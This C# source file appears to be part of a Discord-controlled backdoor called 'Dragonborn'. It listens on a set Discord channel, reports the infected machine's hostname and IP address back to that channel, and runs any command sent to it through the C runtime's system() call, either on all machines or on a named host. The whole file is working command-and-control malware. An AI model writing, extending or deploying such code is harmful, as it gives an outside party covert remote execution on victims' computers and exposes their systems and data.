using Discord;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

namespace Dragonborn
{
    class Commands
    {
        [DllImport("msvcrt.dll")]
        public static extern int system(string cmd);

        static ulong channelid = 1123123123123123123; //channel id
        static string host = Dns.GetHostName();
        static IPAddress ip = Dns.GetHostByName(host).AddressList[0];

        public static async Task MessageReceived(SocketMessage message)
        {
            if (message.Channel.Id == channelid && message.Content.Contains("!dragonborn ")) 
            {             
                string arg = message.Content.Remove(message.Content.IndexOf("!dragonborn"), "!dragonborn".Length);

                if (arg.Contains(" /l"))
                {
                    arg = arg.Remove(arg.IndexOf(" /l"), " /l".Length);
                    await message.Channel.SendMessageAsync("[DRAGONBORN] PC: " + host + " IP: " + ip.ToString());
                }

                if (arg.Contains(" /t ALL /c "))
                {
                    string cmd = arg.Remove(arg.IndexOf(" /t ALL /c "), " /t ALL /c ".Length);
                    system(cmd);
                }

                if (arg.Contains(" /t " + host + " /c "))
                {
                    string del = " /t " + host + " /c ";
                    string cmd = arg.Remove(arg.IndexOf(del), del.Length);

                    system(cmd);
                }
            }
        }
    }
}
